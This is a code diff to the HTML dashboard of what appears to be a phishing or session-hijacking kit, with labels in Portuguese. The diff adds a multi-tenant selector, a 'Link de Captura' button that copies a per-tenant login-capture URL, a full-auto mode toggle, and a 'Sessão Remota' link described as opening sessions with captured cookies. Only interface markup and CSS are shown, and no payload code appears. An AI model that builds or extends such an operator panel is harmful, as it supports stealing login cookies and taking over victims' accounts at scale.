@@ -556,6 +556,19 @@
     }
 
     /* Toast */
+    .tenant-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      padding: 2px 8px;
+      border-radius: 6px;
+      font-size: 11px;
+      font-weight: 600;
+      background: rgba(99, 102, 241, 0.12);
+      border: 1px solid rgba(99, 102, 241, 0.35);
+      color: #a5b4fc;
+    }
+
     #toast {
       position: fixed;
       bottom: 24px;
@@ -603,20 +616,39 @@
       </div>
     </div>
 
-    <div class="action-group" style="display: flex; align-items: center; gap: 10px;">
+    <!-- Seletor Multi-Tenant e Ações -->
+    <div class="action-group" style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">
+      
+      <!-- Seletor de Tenant -->
+      <div style="display: flex; align-items: center; gap: 8px; background: #0d0d11; border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 8px; padding: 5px 12px;">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="16" height="20" x="4" y="2" rx="2" ry="2"/><path d="M9 22v-4h6v4"/><path d="M8 6h.01"/><path d="M16 6h.01"/><path d="M12 6h.01"/><path d="M12 10h.01"/><path d="M12 14h.01"/><path d="M16 10h.01"/><path d="M16 14h.01"/><path d="M8 10h.01"/><path d="M8 14h.01"/></svg>
+        <select id="seletor-tenant" style="background: transparent; border: none; color: #fff; font-size: 12px; font-weight: 600; outline: none; cursor: pointer; font-family: inherit;">
+          <option value="todos" style="background: #121217; color: #fff;">🏢 Todos os Tenants (Global)</option>
+        </select>
+      </div>
+
+      <!-- Link de Captura Rápido -->
+      <button class="btn btn-secondary" id="btn-copiar-link-login" type="button" title="Copiar URL de login para o tenant selecionado" style="border-color: rgba(99, 102, 241, 0.4); color: #a5b4fc;">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <span>Link de Captura</span>
+      </button>
+
       <button class="btn btn-secondary" id="btn-toggle-auto" type="button" title="Alternar entre modo 100% autônomo e modo manual" style="border-color: rgba(2, 215, 47, 0.4); background: rgba(2, 215, 47, 0.1); color: var(--accent-green); font-weight: 600;">
         <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
         <span id="auto-mode-label">Modo Full-Auto: ATIVO</span>
       </button>
-      <a class="btn btn-secondary" href="/sessaoremota" target="_blank" title="Abrir Sessão Remota Ativa com cookies capturados" style="text-decoration: none; border-color: rgba(2, 215, 47, 0.4); color: var(--accent-green); font-weight: 600;">
-        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+      
+      <a class="btn btn-secondary" id="link-sessao-remota-top" href="/sessaoremota" target="_blank" title="Abrir Sessão Remota Ativa com cookies capturados" style="text-decoration: none; border-color: rgba(2, 215, 47, 0.4); color: var(--accent-green); font-weight: 600;">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="14" x="2" y="3" rx="2"/><line x1="8" x2="16" y1="21" y2="21"/><line x1="12" x2="12" y1="17" y2="21"/></svg>
         <span>Sessão Remota</span>
       </a>
+
       <button class="btn btn-secondary" id="btn-atualizar" type="button" title="Atualizar dados agora">
         <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/></svg>
         <span>Atualizar</span>
       </button>
-      <button class="btn btn-danger" id="btn-limpar" type="button" title="Limpar todos os registros capturados">
+
+      <button class="btn btn-danger" id="btn-limpar" type="button" title="Limpar registros do tenant selecionado">
         <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 6h18M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2M10 11v6M14 11v6"/></svg>
         <span>Limpar</span>
       </button>
